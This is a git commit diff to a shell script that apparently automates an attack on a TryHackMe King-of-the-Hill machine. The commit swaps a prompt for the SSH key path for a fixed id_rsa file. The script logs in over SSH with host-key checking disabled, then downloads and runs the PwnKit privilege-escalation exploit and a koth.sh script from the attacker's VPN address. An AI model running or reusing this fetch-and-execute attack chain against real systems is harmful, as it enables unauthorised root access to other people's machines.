5fd005c272d273e3fa2bfeec981d609f7ceeece1
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-08-31 18:30:51 +0100

    Update Production.sh

--- Production/Production.sh
+++ Production/Production.sh
@@ -3,12 +3,11 @@
 
 read -p "Your TryHackMe username: " nick
 read -p "Enter the machine IP address: " ip_address
-read -p "Enter please the id_rsa Path: " id_rsa_path
 read -s -p "Enter the new password: " password
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
-ssh -o StrictHostKeychecking=no -i "$id_rsa_path" ashu@"$ip_address" << EOF
+ssh -o StrictHostKeychecking=no -i id_rsa ashu@"$ip_address" << EOF
 
     cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
     cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
